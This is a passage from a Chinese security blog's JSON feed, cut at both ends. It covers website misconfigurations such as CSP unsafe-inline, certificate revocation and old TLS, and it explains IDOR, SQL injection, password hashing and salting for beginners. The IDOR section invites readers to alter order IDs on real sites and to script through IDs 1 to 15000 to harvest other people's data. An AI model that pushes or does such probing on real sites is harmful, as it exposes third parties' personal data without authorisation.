位置是否受到信任來阻擋非預期的對外連線，加強網站安全性，在 http header 定義限制載入的跨站 script 像是 <code>img-src、script-src</code>…等這些可以載入外部資源的標籤。</p>\n<p>根據檢測的結果顯示，其實幾乎檢測出有錯誤設置的網站裡都有 <code>unsafe-inline</code> 以及 <code>unsafe-eval</code> 的身影，但其實 CSP 是<strong>預設禁止使用 inline script 或 inline CSS 以及 eval 函式</strong>的。</p>\n<p>以禁止使用 inline script 或 inline CSS 來說，<strong>為了開發時程或是更好的引用第三方套件</strong>，經常會在 HTML 中寫入 inline 的程式碼，但這種手法也是攻擊者會使用的，然而在瀏覽器並不能確認的情況下，為求安全， CSP 希望以預設禁止的方式讓開發人員將 inline 的程式碼移到外部來避免 HTML 中出現 inline 程式的可能，而禁止 eval 函式是因為雖然 eval （）在開發上有一定的方便性，但也因此容易衍生出 XSS 的風險，所以 <strong>eval 函式與 inline 的程式碼相同，都是被 CSP 預設禁止</strong>的。</p>\n<p>其實看到這邊應該可以發現，在 CSP 發生錯誤設置的情況基本上會是因為在開發的過程中為了開發上的便利或為了更好的引用第三方套件而導致，不過從實務的角度上來說，這樣的選擇無可厚非，只是該如何在資安以及開發的速度及便利性上取得平衡，無論是在其他針對 XSS 方面補強或更改設置其實都行，因此，在下一篇裡我也會針對這個問題提出一些解決辦法，希望讓大家能夠依據自身的情況去做一些調整。</p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-4\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-4\">#</a> 初步自我檢視方式</h3>\n<p>按下 F12 後，點選 Network 在左方開啟想要檢視的檔案，接著選擇 Header 便可以查看是否有設置 CSP 以及 CSP 是否有 unsafe-inline 以及 unsafe-eval 的身影。</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-exposure/p2.png\" alt=\"\"></p>\n<h2 id=\"%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\">#</a> №１網站憑證完整性不足</h2>\n<p>排名第一的網站憑證完整性不足，在這個項目裡有 90% 的完整性不足例如<strong>憑證撤銷機制未設定完整</strong>或<strong>憑證授權機關資源紀錄檢查</strong>，在沒有這些設定的情況下業者很難防堵任意數位憑證認證機構擅自簽署網域憑證，而憑證完整性不足的業者中還包含了<strong>使用不安全的加密</strong>及<strong>過期憑證</strong>與<strong>過舊的 SSL/TLS 協議</strong>，以上問題增加了業者在憑證層面可能發生資安事件的風險機率。</p>\n<h3 id=\"%E6%86%91%E8%AD%89%E6%92%A4%E9%8A%B7%E6%A9%9F%E5%88%B6%E6%9C%AA%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%95%B4%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%86%91%E8%AD%89%E6%92%A4%E9%8A%B7%E6%A9%9F%E5%88%B6%E6%9C%AA%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%95%B4%EF%BC%9A\">#</a> <strong>憑證撤銷機制未設定完整：</strong></h3>\n<p>可能是未提供 CRL 或 OCSP。 CRL 或 OCSP 為兩種檢查憑證是否被撤銷的方式，用於客戶端驗證伺服器是否可以信任。</p>\n<h3 id=\"%E6%86%91%E8%AD%89%E6%8E%88%E6%AC%8A%E6%A9%9F%E9%97%9C%E8%B3%87%E6%BA%90%E7%B4%80%E9%8C%84%E6%AA%A2%E6%9F%A5%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%86%91%E8%AD%89%E6%8E%88%E6%AC%8A%E6%A9%9F%E9%97%9C%E8%B3%87%E6%BA%90%E7%B4%80%E9%8C%84%E6%AA%A2%E6%9F%A5%EF%BC%9A\">#</a> <strong>憑證授權機關資源紀錄檢查：</strong></h3>\n<p>授權某 CA 為某機構發行憑證的 DNS 紀錄，能確保只有授權的 CA 能為業者的網域發行憑證，防止任意 CA 擅自簽署網域的憑證。</p>\n<h3 id=\"%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%9A\">#</a> <strong>使用不安全的加密：</strong></h3>\n<p>可能是低強度加密套件使用已知且公開的演算法進行資料混淆或是過舊已被破解的加密法。</p>\n<h3 id=\"%E6%86%91%E8%AD%89%E9%81%8E%E6%9C%9F%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%86%91%E8%AD%89%E9%81%8E%E6%9C%9F%EF%BC%9A\">#</a> <strong>憑證過期：</strong></h3>\n<p>憑證不合法、已過期、或是被撤銷而失效。</p>\n<h3 id=\"%E9%81%8E%E8%88%8A%E7%9A%84-ssl%2Ftls-%E5%8D%94%E8%AD%B0%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E9%81%8E%E8%88%8A%E7%9A%84-ssl%2Ftls-%E5%8D%94%E8%AD%B0%EF%BC%9A\">#</a> <strong>過舊的 SSL/TLS 協議：</strong></h3>\n<p>SSL（ Secure Sockets Layer）安全通訊端層，可以用於保持網際網路連線安全防止系統之間的敏感資料被駭客讀取甚至修改任何傳輸資訊。<br>\n TLS（ Transport Layer Security）傳輸層安全性，取代 SSL 的加密協定，比 起 SSL 能提供更高更安全的連線。</p>\n<p>而使用過舊或已廢棄的協議可能導致駭客利用已知漏洞竊取傳輸中的機敏資料。</p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-5\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-5\">#</a> 初步自我檢視方式</h3>\n<p>以 Chrome 為例，點擊網址左方小鎖頭可以看到目前是否為安全連線以及憑證是否有效，點選憑證後可以看見憑證詳細資訊，在 github 上也有提供許多憑證測試工具，可以根據需求選擇工具或是針對工具進行調整。</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-exposure/p3.png\" alt=\"\"><br>\n<img src=\"/img/posts/jo/zerobased-common-risk-exposure/p4.png\" alt=\"\"></p>\n<h2 id=\"%E5%B0%8F%E7%B5%90\"><a class=\"direct-link\" href=\"#%E5%B0%8F%E7%B5%90\">#</a> 小結</h2>\n<p><strong>常見曝險的發生原因大致有兩種</strong></p>\n<ol>\n<li>為了方便業者使用所以有些網頁應用或伺服器端的預設值會以可用性為優先進行考量，也因此當許多的業者直接採用預設值而未進行配置檢視時，很有可能因此產生風險。</li>\n<li>有時業者爲了更好的在網站中使用第三方套件或者是開發時程吃緊的緣故而採用了不安全的配置使風險產生。</li>\n</ol>\n<p>綜合上述兩點，其實在沒有進行過評估或是執行風險管理的情況下，很容易衍生曝險使網站成為攻擊目標，上述是目前發生比例大於 50 % 的網路曝險說明及非常初步的自我檢測方式，如果希望能更精確的針對自身網站的風險進行評估及管理的話，建議可以以文中的關鍵字去搜尋相關工具進行檢測。</p>\n<p>但若希望省時且擔心<strong>檢測出問題不知道該如何修復</strong>或是<strong>修復問題的 CP 值該如何衡量</strong>的話，可以尋找相關的資安服務進行曝險評估。</p>\n<p>以自身為例，Cymetrics 便有提供網站資安曝險評估的服務，包含<strong>實時風險情資調整評級權重</strong>以及<strong>關鍵字形式的全中文風險建議</strong>及<strong>複雜度改善評級象限</strong>的資安服務，如果有相關的資安需求也歡迎將 Cymetrics 的產品列入比較。</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\">#</a> 延伸閱讀：</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\">#</a> 零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery ）</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">認識 CSRF（Cross Site Request Forgery）</a></p>\n</blockquote>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> 零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">認識 XSS（Cross-Site Scripting）</a></p>\n</blockquote>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E4%B8%89%E6%9C%AC%E6%9F%B1%EF%BC%88secure-%26-samesite-%26-httponly%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E4%B8%89%E6%9C%AC%E6%9F%B1%EF%BC%88secure-%26-samesite-%26-httponly%EF%BC%89\">#</a> 零基礎資安系列（三）-網站安全三本柱（Secure &amp; SameSite &amp; HttpOnly）</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly/\">網站安全三本柱（Secure &amp; SameSite &amp; HttpOnly）</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\">#</a> <strong>參考資料：</strong></h2>\n<h3 id=\"x-frame-options%EF%BC%9A\"><a class=\"direct-link\" href=\"#x-frame-options%EF%BC%9A\">#</a> X-Frame-Options：</h3>\n<blockquote>\n<p><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options#%E4%BD%BF%E7%94%A8_x-frame-options\">https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options</a></p>\n</blockquote>\n<h3 id=\"gartner-list-of-critical-security-projects%EF%BC%9A\"><a class=\"direct-link\" href=\"#gartner-list-of-critical-security-projects%EF%BC%9A\">#</a> Gartner list of critical security projects：</h3>\n<blockquote>\n<p><a href=\"https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/\">https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/</a></p>\n</blockquote>\n<h3 id=\"dmarc%EF%BC%9A\"><a class=\"direct-link\" href=\"#dmarc%EF%BC%9A\">#</a> DMARC：</h3>\n<blockquote>\n<p><a href=\"https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;ref_topic=2759254\">https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;ref_topic=2759254</a></p>\n</blockquote>\n",
      "date_published": "2021-07-09T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "title": "為什麼忘記密碼時只能重設，不把舊密碼告訴我？",
      "content_html": "<p>某天小明在整理他的我的最愛（到底誰的），發現了一個以前很常逛，但已經將近半年多沒去的一個論壇。小明想回去看看那邊變得怎麼樣了，於是點進去那個論壇，輸入了帳號密碼，得到了密碼錯誤的回覆。</p>\n<p>嘗試了幾次之後，系統提示小明可以使用「忘記密碼」的功能，所以小明填了自己的 email 之後去信箱收信，發現系統傳來一個「重設密碼」的連結。雖然說最後小明成功利用重新設定的密碼登入，但有個問題讓他百思不得其解：</p>\n<blockquote>\n<p>「奇怪欸，幹嘛要我重設密碼，為什麼不把舊的密碼寄給我就好？」</p>\n</blockquote>\n<!-- summary -->\n<p>應該有許多人都跟小明一樣，有過類似的疑惑。把舊密碼寄給我不是很好嗎，幹嘛強迫我換密碼？</p>\n<p>這一個看似簡單的問題，背後其實藏了許多資訊安全相關的概念，就讓我們慢慢尋找問題的答案，順便學習一些基本的資安知識吧！</p>\n<!-- summary -->\n<p>先提醒一下，雖然說前半段看起來可能跟文章主題無關，但好酒沉甕底，我保證最後會把這些東西關聯起來。</p>\n<h2 id=\"%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\"><a class=\"direct-link\" href=\"#%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\">#</a> 被偷走的資料庫</h2>\n<p>大家應該很常看到新聞說哪個網站的資料又被偷走了，顧客個資全部都外洩出去。像是國外知名的網域代管網站 <a href=\"https://www.inside.com.tw/article/25661-godaddy-email-addresses-passwords-security-breach-managed-wordpress-ssl-keys\">GoDaddy</a> 就外洩了 120 萬筆用戶資料，而台灣之前也有過<a href=\"https://www.ithome.com.tw/news/146427\">愛心協會捐款個資外洩</a>的狀況發生。</p>\n<p>這邊我想帶大家探討的兩個問題是：</p>\n<ol>\n<li>資料真的這麼容易外洩嗎？</li>\n<li>資料外洩之後，可能造成什麼後果？</li>\n</ol>\n<p>我們先來看第一個問題，有很多安全性的漏洞可以造成資料外洩，而有些漏洞的攻擊方式，比你想的還簡單一百倍。</p>\n<p><img src=\"/img/posts/huli/reset-password/p2.jpeg\" alt=\"Photo by Arget on Unsplash\"></p>\n<p>你想像中的駭客可能像上面那樣，打著一大堆不知道在幹嘛的指令，畫面上出現很多黑底白字或是綠字的畫面，完全搞不懂在幹嘛，但是做著做著網站就被打下來了。</p>\n<p>而事實上有些漏洞，可能在網址列上面改幾個字就攻擊成功了，就算你不懂任何程式也做得到。</p>\n<p>舉例來說好了，假設今天有個購物網站，你買了一些東西之後送出訂單，訂單成立後跳轉到訂單頁面，上面有著一大堆你的個資，例如說：姓名、收貨地址、聯絡電話以及 Email 等等。</p>\n<p>然後你發現訂單頁面的網址是 <a href=\"https://shop.huli.tw/orders?id=14597\">https://shop.huli.tw/orders?id=14597</a></p>\n<p>而正好你的訂單編號也是 14597，在好奇心的驅使之下，你就試著把數字改成 14596，然後按下 Enter。</p>\n<p>當網站載入完成之後，你竟然還真的能看到編號為 14596 的訂單，上面出現一個你不認識的人的姓名、收貨地址、聯絡電話跟 Email。</p>\n<p>有些攻擊就是這麼樸實無華且枯燥，只要改個字就能看到屬於其他人的資料。這時候如果你會寫程式的話，就可以寫個腳本自動去抓 id 是 1 一直到 id 是 15000 的資料，你就拿到了這個購物網站 15000 筆訂單的資訊，也就是一萬多個顧客的個資。</p>\n<p>這過程中沒有什麼黑底白字的畫面，也不用一直瘋狂打字，唯一需要的只有改數字，個資就輕鬆到手。</p>\n<p>這類型的漏洞有個專有名詞，稱為 IDOR，全名是：Insecure direct object references，大約就是不安全的直接資料存取的意思。漏洞產生的原因就是工程師在開發時，並沒有注意到權限控管，因此讓使用者能存取到其他人的資料。</p>\n<p>有些人看到這邊可能以為我只是為了文章淺顯易懂，所以才舉一個簡化的例子，現實生活中的攻擊才沒這麼簡單。</p>\n<p>這句話算是對了一半，大部分的網站確實都不會有這麼明顯的一個漏洞，攻擊方式會更複雜一點。但可怕的是，還真的有些網站就是這麼簡單，就是改個數字就可以拿到別人的資料。</p>\n<p>台灣有一個網站叫做 <a href=\"https://zeroday.hitcon.org/\">HITCON ZeroDay</a>，是由台灣駭客協會所維護的漏洞回報平台。有些人發現漏洞之後可能會竊取個資拿去賣，從事非法行為，也有些人發現漏洞只是為了鍛鍊技術，並沒有想要做什麼壞事。</p>\n<p>因此就可以透過這個平台進行回報，回報漏洞之後負責維護平台的志工們會幫你驗證漏洞，驗證過後回報給負責的廠商，讓他們去修復漏洞。</p>\n<p>這個平台上的漏洞在修復過後隔一陣子會公開，或者儘管廠商沒有回報修復，過一陣子（例如說兩個月）後也會公開，因此在這平台上可以找到許多公開的漏洞，看過之後你大概就不會想在網站註冊時留下真實個資了…</p>\n<p>例如說這兩個就是 IDOR 的真實漏洞：</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00206\">享健身xarefit 任意訪問/下載所有會員個資</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00260\">DoorGods 防疫門神實聯制系統IDOR導致個資外洩</a></li>\n</ol>\n<p>對，不要懷疑，就真的只是在網址上改個數字而已這麼容易。</p>\n<p>以後只要看到網址列上有這種數字，就可以試著去改改看，搞不好不會寫程式的你也可以發現 IDOR 的漏洞。</p>\n<p>除了這種只要改個東西的漏洞之外，還有另外一個很常見但是需要一點技術能力才能攻破的漏洞，叫做 SQL Injection。</p>\n<p>先來講講 SQL 是什麼，簡單來說就是跟資料庫查詢東西的一種程式語言。既然說是語言那就會有固定語法，若是以中文舉例，大概就像是：</p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 1 的」，按照「建立時間」排序</p>\n</blockquote>\n<p>用「」框起來的部分代表可以變動，而其他關鍵字例如說「去找」、「給我」這些都是固定的，因為語法要固定才能寫程式去解析。</p>\n<p>同樣以上面假想的購物網站為例，如果網址是 <a href=\"https://shop.huli.tw/orders?id=14597%EF%BC%8C%E9%82%A3%E7%B6%B2%E7%AB%99%E5%8E%BB%E8%B7%9F%E8%B3%87%E6%96%99%E5%BA%AB%E6%8B%BF%E8%B3%87%E6%96%99%E6%99%82%EF%BC%8C%E6%8C%87%E4%BB%A4%E5%A4%A7%E6%A6%82%E5%B0%B1%E6%98%AF%EF%BC%9A\">https://shop.huli.tw/orders?id=14597，那網站去跟資料庫拿資料時，指令大概就是：</a></p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 14597 的」</p>\n</blockquote>\n<p>因為網址列上的 id 是 14597 嘛，所以這個 id 就會被放到查詢的指令去，如果 id 是別的，那查詢的指令也會不一樣。</p>\n<p>這時候如果我的 id 不是數字，而是「1 的順便給我使用者資料」，查詢就變成：</p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 1 的順便給我使用者資料」</p>\n</blockquote>\n<p>那整個網站的使用者資料就順便被我抓下來了。</p>\n<p>這個攻擊之所以叫做 SQL injection，重點就在於那個 injection，攻擊者「注入」了一段文字被當作指令的一部分執行，所以攻擊者就可以執行任意查詢。</p>\n<p>比起上面講的 IDOR，SQL injection 通常會更為致命，因為不只是訂單資料本身，連其他資料也會被一起撈出來。所以除了訂單資料，會員資料跟商品資料都有可能一起外洩。</p>\n<p>這邊也隨便找兩個公開的案例：</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2020-00276\">北一女中網站存在SQL Injection漏洞</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00052\">桃園高中 網站 SQL injection</a></li>\n</ol>\n<p>而防禦方式就是不要把使用者輸入的「1 的順便給我使用者資料」直接當作指令，而是經過一些處理，讓整段查詢變成：「給我 id 是：『1 的順便給我使用者資料』的資料」，那因為沒有這個 id，所以什麼事也不會發生。</p>\n<h2 id=\"%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\">#</a> 個資洩漏了，然後呢？</h2>\n<p>前面我們已經看到了針對那些沒有做好防禦的網站，個資外洩是多麽容易的一件事情。</p>\n<p>那個資洩漏之後，對使用者會有什麼影響呢？</p>\n<p>大家最感同身受的應該就是詐騙電話吧，例如說某些買書的網站或是訂房網站，打過來跟你說什麼要分期退款，為了博取你的信任，連你買了哪本書，訂了哪個房間，或是你家地址跟姓名全都講得出來。</p>\n<p>這些都是因為資料外洩的緣故，詐騙集團才會知道的這麼清楚。</p>\n<p>但除了這些個資以外，還有兩個東西也會外洩，那就是你的帳號跟密碼。</p>\n<p>也許你會想說：「不就帳號跟密碼嗎，我就在那個網站上面改密碼以後再用就好啦！」</p>\n<p>事情也許沒有你想的這麼簡單。如果你沒有用密碼管理軟體的話，我大膽猜測你所有的密碼可能都是同一組。因為怕記不起來嘛，所以乾脆都用同一組密碼。</p>\n<p>這時候如果帳密外洩，駭客是不是就可以拿這組帳密去其他服務試試看？</p>\n<p>拿去登你的 Google，登你的 Facebook，這時候用同一組密碼的人就會被登進去。所以從表面看只是一個購物網站被入侵，但造成的結果卻是你的 Google 還有 Facebook 也一起被盜了。</p>\n<p>所以，有時候某個網站被盜帳號可能不是那個網站的問題，而是駭客在其他地方拿到了你的帳號密碼，就來這邊試試看，沒想到就中了。</p>\n<p>對於網站的開發者而言，保護好使用者的個資是天經地義的事情，保護密碼也是，有沒有什麼好方法可以保護密碼呢？</p>\n<p>加密嗎？把密碼用某些演算法加密，這樣資料庫儲存的就會是加密後的結果，儘管被偷走了，駭客只要沒有解密的方法就解不開。</p>\n<p>聽起來似乎是最安全的做法了，但其實還有一個問題，那就是網站的開發者還是會知道怎麼解密，如果有工程師監守自盜怎麼辦？他還是可以知道每個使用者的密碼是什麼，可以把這些資訊拿去賣或者是自己利用。</p>\n<p>嗯…似乎我們也不能怎麼樣，因為無論如何，開發者都需要有方法知道資料庫存的密碼究竟是多少吧？不然在登入的時候怎麼確認帳號密碼是對的？</p>\n<p>再者，這樣聽起來應該夠安全了，要怎麼樣才能更安全？難道要連網站的開發者都無法解密，都不知道密碼是什麼才夠安全嗎？</p>\n<p>Bingo！答對了，就是要這樣沒錯！</p>\n<h2 id=\"%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\"><a class=\"direct-link\" href=\"#%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\">#</a> 沒有人知道你的密碼，包括網站本身</h2>\n<p>事實上，網站的資料庫是不會儲存你的密碼的。</p>\n<p>或更精確地說，不會儲存你的「原始密碼」，但會儲存密碼經過某種運算後的結果，而且最重要的是，這個運算是無法還原的。</p>\n<p>直接舉例比較快，假設今天有個很簡單的演算法，可以把密碼做轉換，轉換方式是：「數字不做轉換，英文字母把 a 換成 1，b 換成 2…z 換成 26」，以此類推，第幾個字母就換成幾，大小寫不分都一樣（先假設不會有符號）。</p>\n<p>如果密碼是 abc123，轉換完就變成 123123。</p>\n<p>在使用者註冊的時候，網站就把使用者輸入的 abc123 轉成 123123，然後存到資料庫裡面。因此資料庫存的密碼是 123123，而不是 abc123。</p>\n<p>當使用者登入時，我們就再把輸入的值用同樣的邏輯轉換，如果輸入一樣，轉換後的結果就會一樣對吧？就知道密碼是不是正確的。</p>\n<p>當駭客把資料庫偷走以後，會拿到 123123 這組密碼，那一樣啊，不是可以推論出原本是 abc123 嗎？不不不，沒這麼簡單。</p>\n<p>123123、abcabc、12cab3…這些密碼轉換之後，不也是 123123 嗎？所以儘管知道轉換規則跟結果，卻沒有辦法還原成「唯一一組密碼」，這就是這個演算法厲害的地方！</p>\n<p>這樣的轉換就叫做雜湊（Hash），abc123 每次 hash 過後的結果都會是 123123，但是從 123123 卻無法推回輸入一定是 abc123，因為有其他種可能性存在。</p>\n<p>這就是 hash 跟加密最大的不同。</p>\n<p>加密跟解密是成對的，如果可以加密就一定可以解密，所以你知道密文跟密鑰，就可以知道明文。但 hash 不同，你知道 hash 的演算法跟結果，卻無法回推出原本的輸入是什麼。</p>\n<p>而這個機制最常見的應用之一，就在於密碼的儲存。</p>\n<p>在註冊時把 hash 過後的密碼存進資料庫，登入時把輸入的密碼 hash 過後跟資料庫比對，就知道密碼是否正確。就算資料庫被偷，駭客也不知道使用者的密碼是什麼，因為回推不出來。</p>\n<p>這就是為什麼忘記密碼的時候，網站不會跟你講原本的密碼是什麼，因為網站本身也不知道啊！</p>\n<p>所以不能「找回密碼」，只能「重設密碼」，因為重設就代表你輸入新的密碼，然後網站把新的密碼 hash 之後存進資料庫，未來登入時就會用這組新的 hash 去比對。</p>\n<p>有些人可能會注意到這樣的儲存方式似乎有個漏洞，延續前面的例子，資料庫存的是 123123 而我的原始密碼是 abc123，這樣如果用「abcabc」，hash 過後也是 123123，不就也可以登入嗎？這樣不太對吧，這不是我的密碼欸</p>\n<p>有兩個不同的輸入卻產生出同一組輸出，這種狀況稱為碰撞（hash collision），碰撞一定會發生，但如果演算法設計的好，碰撞的機率就超級無敵小，小到幾乎可以忽略。</p>\n<p>前面提的轉換規則只是為了方便舉例，真實世界中用的演算法複雜許多，就算只有一個字不同，結果都會天差地遠，以 SHA256 這個演算法為例：</p>\n<ol>\n<li>abc123 =&gt; 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090</li>\n<li>abc124 =&gt; cd7011e7a6b27d44ce22a71a4cdfc2c47d5c67e335319ed7f6ae72cc03d7d63f</li>\n</ol>\n<p>類似的輸入卻產生截然不同的輸出。</p>\n<p>像我前面舉例用的轉換就是不安全的 hash 演算法，要盡量避免使用或是避免自己設計，盡可能使用密碼學家跟專家設計出的演算法，像是上面提到的 SHA256。</p>\n<p>在使用這些演算法的時候，也要特別注意一下是否安全，因為有些演算法雖然也是由專家設計，但已經被證明是不安全的，例如說密碼用 MD5 來 hash 後儲存就是不安全的，可以參考：<a href=\"https://security.stackexchange.com/questions/19906/is-md5-considered-insecure\">Is MD5 considered insecure?</a></p>\n<h2 id=\"%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\">#</a> 所以，儲存 hash 後的值就沒事了嗎？</h2>\n<p>抱歉，其實只儲存密碼 hash 過後的值是不夠的。</p>\n<p>咦，為什麼？我剛剛不是說沒辦法反推出結果嗎，那為什麼不夠？</p>\n<p>雖然說沒辦法反推出結果，但攻擊者可以利用「輸入一樣，輸出一定一樣」的特性，先建好一個資料庫。</p>\n<p>舉例來說，假設有個很常見的密碼 abc123，hash 過後的值是 6ca13d，那攻擊者就可以先算好，然後把這個關係存在資料庫，所以攻擊者的資料庫裡面就可能會有一百萬組最常見密碼的清單，裡面有著每個密碼跟它 hash 過後的值。</p>\n<p>那接下來只要在 hash 過後的資料庫發現 6ca13d，攻擊者就可以透過查表的方式，查出原本的密碼是 abc123。這不是利用演算法反推結果，這只是利用現有資料來查詢而已。</p>\n<p>為了防禦這種攻擊，還要做一件事情叫做加鹽（Salting），沒錯，就是鹽巴的那個鹽。通常會幫每個使用者產生一個獨一無二的鹽巴，例如說 5ab3od（實際上會更長，可能 16 或 32 個字以上），接著把我的密碼 abc123 加上我的鹽巴，變成 abc1235ab3od，然後用這個加鹽過後的結果去做 hash。</p>\n<p>為什麼要這樣做呢？</p>\n<p>因為攻擊者預先準備好的表格中，比起 abc123，出現 abc1235ab3od 的機率顯然更低，同時又因為長度變長了，暴力破解的難度變得更高。如此一來，密碼就變得更難破解了。</p>\n<p>更多資訊請參考：<a href=\"https://www.ithome.com.tw/voice/127918\">不是祕密的祕密</a></p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>忘記密碼時網站不會把密碼寄給我，因為網站自己都不知道我的密碼是什麼。雖然聽起來不太可能，但實際狀況就是如此。為了安全性，這是必須的手段。</p>\n<p>要達成這樣的目的，背後最重要的技術原理就是 hash，「同樣的密碼會產生同樣的 hash 